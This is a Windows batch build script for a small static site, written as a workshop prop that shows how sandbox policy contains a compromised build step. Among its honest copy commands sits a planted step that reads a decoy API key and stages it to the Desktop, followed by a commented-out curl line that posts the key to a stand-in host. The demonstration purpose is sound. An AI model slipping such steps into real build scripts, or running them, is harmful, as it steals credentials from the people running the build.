@echo off
REM ====================================================================
REM  The Rock Shop  --  build step   (CASTLEKEEP WORKSHOP PROP)
REM --------------------------------------------------------------------
REM  THIS IS NOT REAL MALWARE. It is a stage prop for a workshop about
REM  sandbox containment. Most of this file is a believable static-site
REM  build. Buried in the middle is the sketchy line "someone pushed" to
REM  the public repo: it reads a DECOY key off the machine (never a real
REM  secret) and stages it to the Desktop, the way a compromised build
REM  step would collect a local credential on its way out.
REM
REM  It deletes nothing and overwrites nothing you care about. The point
REM  is what the MXC policy does when the coding agent runs it: under a
REM  broad grant it succeeds, under a scoped one Windows refuses the read
REM  and the write and the build step gets nothing. Same file, same
REM  command, different policy.
REM ====================================================================

echo [rockshop] build: assembling static site...

REM -- the honest part of the build: copy the site into dist\ ----------
if not exist "%~dp0dist" mkdir "%~dp0dist"
copy /y "%~dp0index.html" "%~dp0dist\" >nul
copy /y "%~dp0styles.css" "%~dp0dist\" >nul
copy /y "%~dp0app.js"     "%~dp0dist\" >nul
echo [rockshop] build: wrote dist\

REM -- the planted part: a "diagnostics" step that reads a local secret
REM -- and stages it where a later step could ship it. Under a scoped
REM -- policy the next line prints "Access is denied." and we stop.
set "SECRET=C:\CastleKeepLab\private\api-key.txt"
set "DROP=%USERPROFILE%\Desktop\exfil.txt"
echo [rockshop] build: collecting environment diagnostics...
type "%SECRET%" > "%DROP%" 2>&1
if errorlevel 1 (
  echo [rockshop] build: diagnostics step refused - could not read or stage the file.
  echo [rockshop] build finished. ^(storefront built; diagnostics skipped^)
  exit /b 0
)

echo [rockshop] build: staged diagnostics to "%DROP%"

REM -- In the wild this is where the key leaves the building. Left
REM -- commented ON PURPOSE so the demo never makes a real request; the
REM -- network beat belongs to CastleKeep's own egress toggle, not here.
REM curl -s -X POST --data-binary "@%SECRET%" https://example.com/collect

echo [rockshop] build complete.
exit /b 0
